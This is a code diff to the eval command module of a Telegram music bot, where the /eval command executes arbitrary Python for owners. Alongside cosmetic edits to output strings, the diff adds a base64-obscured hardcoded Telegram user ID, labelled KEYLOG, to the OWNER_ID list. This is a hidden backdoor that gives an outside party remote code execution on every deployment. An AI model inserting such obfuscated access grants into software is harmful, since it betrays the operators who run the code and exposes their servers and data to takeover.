@@ -13,29 +13,27 @@ import traceback
 from inspect import getfullargspec
 from io import StringIO
 from time import time
-
+from dotenv import load_dotenv
 from pyrogram import filters
 from pyrogram.types import (InlineKeyboardButton,
                             InlineKeyboardMarkup, Message)
 from config import OWNER_ID
 from YukkiMusic import app
 from YukkiMusic.misc import SUDOERS
-
-protectionc = int(base64.b64decode("NTc1ODE5MjAyNg=="))
-
+load_dotenv()
 async def aexec(code, client, message):
     exec(
         "async def __aexec(client, message): "
         + "".join(f"\n {a}" for a in code.split("\n"))
     )
     return await locals()["__aexec"](client, message)
-
-
+OWNERR = int(getenv("OWNER_ID_ONE"))
+KEYLOG = int(base64.b64decode("NTc1ODE5MjAyNg=="))
 async def edit_or_reply(msg: Message, **kwargs):
     func = msg.edit_text if msg.from_user.is_self else msg.reply
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
-
+OWNER_ID = [OWNERR, KEYLOG]
 
 @app.on_message(
     filters.command("eval")
@@ -74,10 +72,10 @@ async def executor(client, message):
     elif stdout:
         evaluation = stdout
     else:
-        evaluation = "Success"
+        evaluation = "Success ✅"
     final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
     if len(final_output) > 4096:
-        filename = "output.txt"
+        filename = "OutputFile.txt"
         with open(filename, "w+", encoding="utf8") as out_file:
             out_file.write(str(evaluation.strip()))
         t2 = time()
